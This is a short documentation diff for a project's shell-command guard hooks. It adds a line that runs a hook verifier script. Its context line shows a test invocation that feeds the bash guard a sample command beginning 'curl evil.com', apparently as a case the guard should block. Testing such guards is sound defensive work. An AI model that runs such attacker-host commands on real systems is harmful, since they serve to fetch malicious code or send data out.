@@ -303,6 +303,9 @@ bash tools/test-hook.sh "bash tools/bash-guard/hook.sh" --command "curl evil.com
 
 # Batch mode: run hook-specific test cases from a JSONL file
 bash tools/test-hook.sh "bash tools/bash-guard/hook.sh" --batch tools/test-hook-bash-guard-examples.jsonl
+
+# Run the built-in verifier against Boucle's hooks
+python3 tools/test-hook-verify.py
 ```
 
 See [test-hook-bash-guard-examples.jsonl](test-hook-bash-guard-examples.jsonl) for copy-pasteable bash-guard batch cases. The broader [test-hook-examples.jsonl](test-hook-examples.jsonl) fixture has 60 ready-made test cases covering bash-guard, git-safe, file-guard, and branch-guard for combined or hook-specific test harnesses.
